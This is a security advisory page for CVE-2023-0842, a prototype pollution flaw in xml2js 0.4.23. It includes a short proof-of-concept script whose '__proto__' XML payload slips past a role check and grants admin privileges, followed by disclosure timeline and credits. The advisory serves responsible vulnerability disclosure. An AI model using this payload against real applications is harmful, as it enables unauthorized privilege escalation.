### Exploit.md

```
var parseString = require('xml2js').parseString;

let normal_user_request = "<role>admin</role>";
let malicious_user_request = "<__proto__><role>admin</role></__proto__>";

const update_user = (userProp) => {
    // A user cannot alter his role. This way we prevent privilege escalations.
    parseString(userProp, function (err, user) {
        if(user.hasOwnProperty("role") && user?.role.toLowerCase() === "admin") {
            console.log("Unauthorized Action");
        } else {
            console.log(user?.role[0]);
        }
    });
}

update_user(normal_user_request);
update_user(malicious_user_request);

```
## Evidence of exploitation

![Exploitation-xml2js](https://user-images.githubusercontent.com/51862990/219061662-8134c98a-e0bf-40c9-9834-426f5213add6.png)

## Our security policy

We have reserved the ID CVE-2023-0842 to refer to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: xml2js 0.4.23
* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/Leonidas-from-XIV/node-xml2js/>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-02-14

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-02-14

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-02-14

Vendor replied acknowledging the report.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-04-10

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Ã‚Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)


